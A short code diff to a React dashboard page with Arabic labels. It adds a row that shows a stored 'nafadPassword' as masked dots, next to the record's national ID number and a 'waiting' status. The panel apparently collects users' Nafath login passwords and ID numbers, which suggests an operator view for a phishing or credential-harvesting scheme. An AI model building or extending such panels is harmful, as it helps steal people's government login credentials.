@@ -2133,6 +2133,32 @@ export default function DashboardPage() {
         <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
           {raw?.nafadIdNumber && renderDataRow("رقم بطاقة الأحوال", raw.nafadIdNumber, "🪪")}
           
+          {/* عرض كلمة المرور (مخفية جزئياً) */}
+          {raw?.nafadPassword && (
+            <div style={{ 
+              display: "flex", 
+              justifyContent: "space-between", 
+              alignItems: "center", 
+              background: "#f9fafb", 
+              borderRadius: 6, 
+              padding: "8px 12px", 
+              border: "1px solid #e5e7eb"
+            }}>
+              <span style={{ fontSize: "0.75rem", color: "#6b7280", display: "flex", alignItems: "center", gap: 6 }}>
+                <span>🔑</span>كلمة المرور
+              </span>
+              <span style={{ 
+                fontSize: "0.8rem", 
+                fontWeight: 600, 
+                color: "#111827",
+                fontFamily: "ui-monospace, monospace",
+                letterSpacing: "2px"
+              }}>
+                {"•".repeat(raw.nafadPassword.length || 4)}
+              </span>
+            </div>
+          )}
+          
           {nafadStatus && (
             <div style={{ 
               ...(statusConfig[nafadStatus] || statusConfig["waiting"]), 
